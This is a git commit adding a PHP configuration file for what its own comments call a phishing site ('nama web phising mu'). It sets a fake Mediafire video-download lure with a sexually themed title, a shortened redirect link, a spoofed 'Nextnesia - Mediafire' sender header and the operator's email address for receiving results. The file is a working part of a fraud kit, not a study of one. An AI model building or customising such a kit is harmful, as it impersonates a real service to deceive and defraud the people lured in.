dfb6e013d3e2bf4a176cca5781d4bb6731e55773
akunesa <125903096+eiji-sky@users.noreply.github.com>
2024-02-26 19:16:23 +0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,10 @@
+<?php
+
+$redirect = 'https://bit.ly/mediafire-terbaru'; // link mediafire asli/redirect
+$namaweb = 'Viral Tobrut Colmek'; // Ganti nama web phising mu di sini 
+$ukuran = '30.5MB'; // Ukuran download video
+
+$sender = 'From: Nextnesia - Mediafire <yumekodeveloper@gmail.com>'; //Nama Ress
+$email = "nesaerwinsyah178@gmail.com"; // Email kamu
+
+?>
